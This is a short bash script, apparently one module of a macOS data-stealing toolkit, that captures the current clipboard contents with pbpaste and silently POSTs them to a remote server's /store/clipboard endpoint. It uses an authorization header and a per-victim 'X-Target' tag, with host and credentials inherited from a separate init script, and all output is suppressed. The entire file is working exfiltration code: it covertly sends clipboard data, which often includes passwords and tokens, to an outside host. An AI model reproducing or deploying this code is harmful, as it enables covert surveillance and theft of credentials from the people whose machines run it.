#!/bin/bash
# clipboard_mac.sh - inherits H, P, AU, TH from init_mac.sh

OUT="captured : $(date '+%Y-%m-%d %H:%M:%S')

[CURRENT CLIPBOARD]
$(pbpaste 2>/dev/null || echo "(empty)")"

echo "$OUT" | curl -s -X POST "https://$H:$P/store/clipboard" \
     -H "Authorization: $AU" \
     -H "Content-Type: text/plain" \
     -H "X-Target: $TH" \
     --data-binary @- >/dev/null 2>&1
